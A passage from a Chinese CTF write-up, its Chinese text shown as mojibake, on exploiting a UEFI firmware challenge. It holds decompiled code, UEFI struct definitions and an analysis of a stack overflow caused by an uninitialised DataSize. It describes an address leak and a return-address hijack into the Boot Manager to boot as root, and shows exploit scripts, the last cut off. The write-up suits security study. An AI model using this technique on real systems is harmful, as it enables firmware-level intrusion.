Data_1[<span class="number">256</span>]; <span class="comment">// [rsp+90h] [rbp-110h] BYREF</span></span><br><span class="line">  __int64 Data_2; <span class="comment">// [rsp+190h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// [rsp+198h] [rbp-8h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+19Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  DataSize = <span class="number">256</span>i64;</span><br><span class="line">  GetVariableName[<span class="number">0</span>] = <span class="string">&#x27;T\0C\01\0N&#x27;</span>;</span><br><span class="line">  GetVariableName[<span class="number">1</span>] = <span class="string">&#x27;E\0K\0_\0F&#x27;</span>;</span><br><span class="line">  v3 = <span class="string">&#x27;Y&#x27;</span>;</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  Output(<span class="string">&quot;Key name:&quot;</span>);</span><br><span class="line">  Input(v8, <span class="number">0x10</span>ui64);</span><br><span class="line">  Str2Unicode((<span class="type">unsigned</span> __int8 *)v8, SetVariableName, <span class="number">0x10</span>ui64);</span><br><span class="line">  ((<span class="type">void</span> (__fastcall *)(__int16 *, <span class="type">void</span> *, <span class="type">char</span> *, __int64 *, <span class="type">char</span> *))gRT-&gt;GetVariable)(</span><br><span class="line">    SetVariableName,</span><br><span class="line">    &amp;GUID,</span><br><span class="line">    Attributes,</span><br><span class="line">    &amp;DataSize,</span><br><span class="line">    Data_1);</span><br><span class="line">  DataSize = <span class="number">8</span>i64;</span><br><span class="line">  v11 = <span class="built_in">strlen</span>(Data_1);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v11; i += <span class="number">8</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    HIWORD(v3) = i / <span class="number">8</span> % <span class="number">3</span> + <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">    ((<span class="type">void</span> (__fastcall *)(__int64 *, <span class="type">void</span> *, <span class="type">char</span> *, __int64 *, __int64 *))gRT-&gt;GetVariable)(</span><br><span class="line">      GetVariableName,</span><br><span class="line">      &amp;GUID,</span><br><span class="line">      Attributes,</span><br><span class="line">      &amp;DataSize,</span><br><span class="line">      &amp;Data_2);</span><br><span class="line">    *(_QWORD *)&amp;Data_1[i] ^= Data_2;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> ((__int64 (__fastcall *)(__int16 *, <span class="type">void</span> *, __int64, __int64, <span class="type">char</span> *))gRT-&gt;SetVariable)(</span><br><span class="line">           SetVariableName,</span><br><span class="line">           &amp;GUID,</span><br><span class="line">           <span class="number">7</span>i64,</span><br><span class="line">           <span class="number">256</span>i64,</span><br><span class="line">           Data_1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="IDAä¸­æ·»åŠ çš„ç»“æ„ä½“"><a href="#IDAä¸­æ·»åŠ çš„ç»“æ„ä½“" class="headerlink" title="IDAä¸­æ·»åŠ çš„ç»“æ„ä½“"></a>IDAä¸­æ·»åŠ çš„ç»“æ„ä½“</h3><p>è¿™é‡Œç»™å‡ºæˆ‘åœ¨ IDA ä¸­æ·»åŠ çš„ç»“æ„ä½“ï¼Œå…¶å„ä¸ªæˆå‘˜çš„æ•°æ®ç±»å‹å¹¶ä¸æ­£ç¡®ï¼Œä¸è¿‡åœ¨ IDA ä¸­é™æ€åˆ†æä¸­å¤Ÿç”¨äº†ï¼Œå½“é‡åˆ°è°ƒç”¨æŸä¸ªå‡½æ•°æ—¶å¦‚æœæƒ³ææ¸…æ¥šç›´æ¥å°±æºç å°±è¡Œäº†ã€‚  </p><h4 id="RuntimeService"><a href="#RuntimeService" class="headerlink" title="RuntimeService"></a>RuntimeService</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">RuntimeService</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">char</span> Hdr[<span class="number">24</span>];</span><br><span class="line">  <span class="type">size_t</span> (*GetTime)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*SetTime)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*GetWakeupTime)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*SetWakeupTime)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*SetVirtualAddressMap)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*ConvertPointer)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*GetVariable)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*GetNextVariableName)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*SetVariable)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*GetNextHighMonotonicCount)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*ResetSystem)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*UpdateCapsule)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*QueryCapsuleCapabilities)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*QueryVariableInfo)(<span class="type">void</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="BootServices"><a href="#BootServices" class="headerlink" title="BootServices"></a>BootServices</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">BootServices</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">char</span> Hdr[<span class="number">24</span>];</span><br><span class="line">  <span class="type">size_t</span> (*RaiseTPL)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*RestoreTPL)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*AllocatePages)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*FreePages)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*GetMemoryMap)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*AllocatePool)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*FreePool)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*CreateEvent)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*SetTimer)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*WaitForEvent)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*SignalEvent)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*CloseEvent)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*CheckEvent)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*InstallProtocolInterface)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*ReinstallProtocolInterface)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*UninstallProtocolInterface)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*HandleProtocol)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*Reserved)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*RegisterProtocolNotify)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*LocateHandle)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*LocateDevicePath)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*InstallConfigurationTable)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*LoadImage)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*StartImage)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*Exit)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*UnloadImage)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*ExitBootServices)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*GetNextMonotonicCount)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*Stall)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*SetWatchdogTimer)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*ConnectController)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*DisconnectController)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*OpenProtocol)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*CloseProtocol)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*OpenProtocolInformation)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*ProtocolsPerHandle)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*LocateHandleBuffer)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*LocateProtocol)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*InstallMultipleProtocolInterfaces)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*UninstallMultipleProtocolInterfaces)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*CalculateCrc32)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*CopyMem)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*SetMem)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*CreateEventEx)(<span class="type">void</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="EFI-SIMPLE-TEXT-OUTPUT-PROTOCOL"><a href="#EFI-SIMPLE-TEXT-OUTPUT-PROTOCOL" class="headerlink" title="EFI_SIMPLE_TEXT_OUTPUT_PROTOCOL"></a>EFI_SIMPLE_TEXT_OUTPUT_PROTOCOL</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">EFI_SIMPLE_TEXT_OUTPUT_PROTOCOL</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">size_t</span> (*Reset)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*OutputString)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*TestString)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*QueryMode)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*SetMode)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*SetAttribute)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*ClearScreen)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*SetCursorPosition)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*EnableCursor)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> *EFI_SIMPLE_TEXT_OUTPUT_MODE_Mode;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="EFI-SIMPLE-TEXT-INPUT-PROTOCOL"><a href="#EFI-SIMPLE-TEXT-INPUT-PROTOCOL" class="headerlink" title="EFI_SIMPLE_TEXT_INPUT_PROTOCOL"></a>EFI_SIMPLE_TEXT_INPUT_PROTOCOL</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">EFI_SIMPLE_TEXT_INPUT_PROTOCOL</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">size_t</span> (*Reset)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*ReadKeyStroke)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*WaitForKey)(<span class="type">void</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="SystemTable"><a href="#SystemTable" class="headerlink" title="SystemTable"></a>SystemTable</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">SystemTable</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">char</span> Hdr[<span class="number">24</span>];</span><br><span class="line">  <span class="type">char</span> FirmwareVendor[<span class="number">8</span>];</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> FirmwareRevision;</span><br><span class="line">  <span class="type">size_t</span> (*ConsoleInHandle)(<span class="type">void</span>);</span><br><span class="line">  EFI_SIMPLE_TEXT_INPUT_PROTOCOL *ConIn;</span><br><span class="line">  <span class="type">size_t</span> (*ConsoleOutHandle)(<span class="type">void</span>);</span><br><span class="line">  EFI_SIMPLE_TEXT_OUTPUT_PROTOCOL *ConOut;</span><br><span class="line">  <span class="type">size_t</span> (*StandardErrorHandle)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> *StdErr;</span><br><span class="line">  <span class="type">size_t</span> (*RuntimeServices)(<span class="type">void</span>);</span><br><span class="line">  BootServices *BootServices;</span><br><span class="line">  <span class="type">size_t</span> NumberOfTableEntries;</span><br><span class="line">  <span class="type">size_t</span> ConfigurationTable;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="æ¼æ´åˆ†æä¸åˆ©ç”¨"><a href="#æ¼æ´åˆ†æä¸åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ†æä¸åˆ©ç”¨"></a>æ¼æ´åˆ†æä¸åˆ©ç”¨</h3><p>è¿™é‡Œå…ˆè§£é‡Šå„ä¸ªå‡½æ•°åšäº†ä»€ä¹ˆï¼š<br>1ã€Addï¼šåˆ©ç”¨ SetVariable å°†ç”¨æˆ·è‡ªå®šä¹‰çš„ (key, value) å†™å…¥ NVRAM ä¸­<br>2ã€Deleteï¼šåˆ©ç”¨ SetVariable å°† NVRAM ä¸­æŒ‡å®šçš„ key çš„ value æ¸…ç©º<br>3ã€Getï¼šç”¨ GetVariable è·å– NVRAM ä¸­æŒ‡å®š key çš„ value å¹¶æ‰“å°<br>4ã€Encodeï¼šåˆ©ç”¨ GetVariable è·å– NVRAM ä¸­æŒ‡å®š key çš„ value å¹¶å­˜å‚¨åœ¨ Data_1 ä¸­ï¼Œæ ¹æ® Data_1 çš„é•¿åº¦ç”¨ GetVariable å°† NVRAM ä¸­ N1CTF_KEY(1&#x2F;2&#x2F;3) å¯¹åº”çš„ value å­˜å‚¨åœ¨ Data_2 ä¸­ï¼Œå¹¶å°† Data_1 å’Œ Data_2 è¿›è¡Œäº¦æˆ–ï¼Œæœ€åå°†æœ€ç»ˆçš„ Data_1 é€šè¿‡ SetVariable å­˜å‚¨å› NVRAM ä¸­ã€‚  </p><p>è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯æ ¹æ® Data_1 çš„é•¿åº¦ç”¨ GetVariable å°† NVRAM ä¸­ N1CTF_KEY(1&#x2F;2&#x2F;3) å¯¹åº”çš„ value å­˜å‚¨åœ¨ Data_2 ä¸­è¿™ä¸€æ­¥ï¼Œä»–æ˜¯åœ¨ä¸€ä¸ª for å¾ªç¯ä¸­è¿›è¡Œçš„ï¼Œè€Œä¸”åœ¨ä¸Šä¸€æ¬¡å¾ªç¯ç»“æŸåä¸‹ä¸€æ¬¡å¾ªç¯å¼€å§‹æ—¶å¹¶æ²¡æœ‰å¯¹ DataSize çš„å€¼è¿›è¡Œåˆå§‹åŒ–ã€‚<br>æˆ‘ä»¬çŸ¥é“åœ¨è°ƒç”¨ GetVariable æ—¶ DataSize ä¼šè¢«è®¾ç½®ä¸º NVRAM ä¸­è¯»å–çš„ value çš„é•¿åº¦ï¼Œå¦‚æœæˆ‘ä»¬èƒ½å¤Ÿè®¾ç½® N1CTF_KEY1 çš„ value é•¿åº¦å¾ˆé•¿ï¼Œé‚£ä¹ˆæˆ‘ä»¬åœ¨ç”¨ GetVariable è·å– N1CTF_KEY2 çš„ value æ—¶å°±ä¼šåœ¨ Data_2 ä¸Šå‘ç”Ÿæ ˆæº¢å‡ºï¼Œè€Œ N1CTF_KEY çš„ value å€¼æˆ‘ä»¬å¯ä»¥é€šè¿‡ Add å‡½æ•°è¿›è¡Œè®¾ç½®ã€‚  </p><p>æ¥ä¸‹æ¥æˆ‘ä»¬é¢ä¸´ç€ä¸¤ä¸ªé—®é¢˜ï¼š<br>1ã€å¦‚ä½•è·å– UiApp å›ºä»¶çš„åŸºå€<br>2ã€æ ˆæº¢å‡ºåæˆ‘ä»¬è¦åŠ«æŒåˆ°å“ªé‡Œ</p><h3 id="åœ°å€æ³„éœ²"><a href="#åœ°å€æ³„éœ²" class="headerlink" title="åœ°å€æ³„éœ²"></a>åœ°å€æ³„éœ²</h3><p>åœ¨ Add çš„æ—¶å€™ï¼Œå¦‚æœæˆ‘ä»¬çš„ value é•¿åº¦åˆšå¥½ä¸º 256ï¼Œé‚£ä¹ˆæˆ‘ä»¬åœ¨ Get çš„æ—¶å€™ä¼šå¸¦å‡ºåé¢çš„ä¸€äº›æ•°æ®ï¼ŒåŸç†åº”è¯¥å’Œç”¨æˆ·æ€çš„ puts å‡½æ•°ç±»ä¼¼ï¼Œé€šè¿‡ \x00 æˆªæ–­è¾“å‡ºï¼Œvalue çš„æ•°ç»„é•¿åº¦ä¸º 256ï¼Œè€Œä¸”åé¢åˆšå¥½è·Ÿç€ä¸€ä¸ªåœ°å€å¯¹è±¡ï¼Œæ‰€ä»¥æŠŠ \x00 å¡«æ»¡åå°±èƒ½å¤Ÿå°†å…¶å¸¦å‡ºæ¥ï¼Œé€šè¿‡åˆ†æè¿™ä¸ªåœ°å€å’Œ UiApp çš„åŸºå€åç§»æ˜¯å›ºå®šçš„ã€‚<br>åœ¨ gdb ä¸­è·å– UiApp æ–¹å¼å’Œæˆ‘ä»¬ä¸Šä¸€ç¯‡æ–‡ç«  <a href="https://9anux.org/2024/12/14/uefi/#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90-2">DubheCTF 2024 ToySMM</a> ä¸­è·å–åé—¨å‡½æ•°çš„åœ°å€æ–¹å¼æ˜¯ä¸€æ ·çš„ï¼Œéƒ½æ˜¯ç›´æ¥åœ¨ gdb ä¸­æœç´¢ä»£ç çš„ text æ®µçš„åå…­è¿›åˆ¶ä¸²ã€‚  </p><h3 id="æ‰§è¡Œæµçš„åŠ«æŒ"><a href="#æ‰§è¡Œæµçš„åŠ«æŒ" class="headerlink" title="æ‰§è¡Œæµçš„åŠ«æŒ"></a>æ‰§è¡Œæµçš„åŠ«æŒ</h3><p>è¿™é‡Œæˆ‘ä»¬äº¤å‰å¼•ç”¨æˆ‘ä»¬çš„ vuln å‡½æ•°æ‰¾åˆ°è°ƒç”¨å®ƒçš„åœ°æ–¹ï¼š </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( vuln() )</span><br><span class="line">&#123;</span><br><span class="line">  Output(<span class="string">&quot;No No No!\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0x8000000000000003</span>ui64;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  sub_23A4(<span class="number">0</span>);</span><br><span class="line">  sub_11A4();</span><br><span class="line">  sub_2645();</span><br><span class="line">  sub_C6B3(v5);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>i64;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è€Œæˆ‘ä»¬çš„ vuln å‡½æ•°çš„è¿”å›å€¼æ˜¯ 0x8000000000000003ui64ï¼Œæ‰€ä»¥ä¸éš¾çŒœæµ‹ else åˆ†æ”¯å°±æ˜¯è¿›å…¥ Boot Managerï¼Œæ‰€ä»¥å°†è¿”å›åœ°å€åŠ«æŒåˆ°è¯¥ else åˆ†æ”¯å³å¯è¿›å…¥åˆ° Boot Manager ç•Œé¢ï¼š  </p><img src="/2025/01/06/uefi2/2.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>æœ€ååœ¨ Boot Manager ä¸­åŠ å…¥è‡ªå·±çš„å¯åŠ¨é¡¹ä½¿ç”¨ root å¯åŠ¨ç³»ç»Ÿå³å¯ã€‚  </p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p>ç”±äº Boot Manager æ˜¯å¯è§†åŒ–ç•Œé¢ï¼Œåœ¨ pwntools ä¸Šéå¸¸éš¾çœ‹ï¼Œæ‰€ä»¥è¿™é‡Œä½¿ç”¨ socat è¿æ¥ã€‚</p><h4 id="exp-sh"><a href="#exp-sh" class="headerlink" title="exp.sh"></a>exp.sh</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">socat $(<span class="built_in">tty</span>),<span class="built_in">echo</span>=0,escape=0x03 SYSTEM:<span class="string">&#x27;python3 ./exp.py&#x27;</span> 2&gt;&amp;1</span><br></pre></td></tr></table></figure><h4 id="exp-py"><a href="#exp-py" class="headerlink" title="exp.py"></a>exp.py</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process([<span class="string">&#x27;python3&#x27;</span>,<span class="string">&#x27;run.py&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lg</span>(<span class="params">buf</span>):</span><br><span class="line">    log.success(<span class="string">f&#x27;\033[33m<span class="subst">&#123;buf&#125;</span>:<span class="subst">&#123;<span class="built_in">eval</span>(buf):#x&#125;</span>\033[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">index</span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">name,value</span>):</span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Key name:&#x27;</span>)</span><br><span class="line">    p.sendline(name)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;value&#x27;</span>)</span><br><span class="line">    p.sendline(value)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">addSend</span>(<span class="params">name,value</span>):</span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Key name:&#x27;</span>)</span><br><span class="line">    p.sendline(name)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;value&#x27;</span>)</span><br><span class="line">    p.send(value)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get</span>(<span class="params">name</span>):</span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Key name:&#x27;</span>)</span><br><span class="line">    p.sendline(name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode</span>(<span class="params">name</span>):</span><br><span class="line">    menu(<span class="number">4</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Key name:&#x27;</span>)</span><br><span class="line">    p.sendline(name)</span><br><span class="line"></span><br><span class="line">key_map = &#123;</span><br><span class="line">    <span class="string">b&quot;up&quot;</span>:    <span class="string">b&quot;\x1b[A&quot;</span>,</span><br><span class="line">    <span class="string">b&quot;down&quot;</span>:  <span class="string">b&quot;\x1b[B&quot;</span>,</span><br><span class="line">    <span class="string">b&quot;left&quot;</span>:  <span class="string">b&quot;\x1b[D&quot;</span>,</span><br><span class="line">    <span class="string">b&quot;right&quot;</span>: <span class="string">b&quot;\x1b[C&quot;</span>,</span><br><span class="line">    <span class="string">b&quot;esc&quot;</span>:   <span class="string">b&quot;\x1b^[&quot;</span>,</span><br><span class="line">    <span class="string">b&quot;enter&quot;</span>: <span class="string">b&quot;\r&quot;</span>,</span><br><span class="line">    <span class="string">b&quot;tab&quot;</span>:   <span class="string">b&quot;\t&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_key</span>(<span class="params">key,times = <span class="number">1</span></span>):</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(times):</span><br><span class="line">        p.send(key_map[key])</span><br><span class="line">        <span class="keyword">if</span> key == <span class="string">b&quot;enter&quot;</span>:</span><br><span class="line">            p.recv()</span><br><span class="line"></span><br><span class="line">p.sendline(<span 